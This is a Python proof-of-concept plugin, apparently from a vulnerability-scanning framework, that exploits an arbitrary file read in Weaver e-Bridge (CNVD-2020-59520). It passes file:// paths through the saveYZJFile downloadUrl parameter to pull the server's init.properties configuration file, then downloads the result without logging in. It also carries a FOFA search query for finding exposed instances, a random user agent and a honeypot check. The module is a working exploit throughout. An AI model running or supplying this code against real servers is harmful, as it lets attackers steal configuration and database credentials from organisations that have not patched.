# coding:utf-8  
import requests
import json
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2022-01-01",        # POC创建时间
        "UpdateDate" : "2022-01-01",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "泛微OA E-Bridge saveYZJFile 任意文件读取漏洞",                        # 漏洞名称
        "VulnID" : "CNVD-2020-59520",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "泛微云桥",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2022-01-01",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            “泛微云桥e-bridge平台”是在原有微信集成平台的基础上，经过二次更新后的一款独立外部对接平台，其主要作用是实现泛微OA平台与微信企业号、阿里钉钉产品的信息对接能力。
            系统对接后，企业内部的OA信息通过微信企业号、阿里钉钉这一终端入口释放出来。
            泛微云桥e-bridge平台saveYZJFile文件可任意读取服务器文件，攻击者通过漏洞可以获取后台/数据库权限。
            
            【安全通告】泛微云桥存在任意文件读取漏洞-吉林农业大学信息化中心: https://nic.jlau.edu.cn/info/1013/1614.htm
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            title="泛微云桥e-Bridge"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        urls = [
            self.target + "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///d://ebridge/tomcat/webapps/ROOT/WEB-INF/classes/init.properties&fileExt=txt",
            self.target + "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///weaver/ebridge/tomcat/webapps/ROOT/WEB-INF/classes/init.properties&fileExt=txt"
            ] # url自己按需调整

        headers = {
                    "User-Agent":get_random_ua(),
                    "Connection":"close",
                    # "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            for url in urls:
                req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
                if req.status_code == 200 and "application/json" in req.headers["Content-Type"] and \
                    "\"isencrypt\":" in req.text and "\"filepath\":" in req.text and "\"updatetime\":" in req.text:

                    con = json.loads(req.text)
                    id = con["id"]
                    req1 = requests.get(self.target + "/file/fileNoLogin/" + id,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
                    vuln = [True,req1.text]

                    break
                else:
                    vuln = [False,req.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()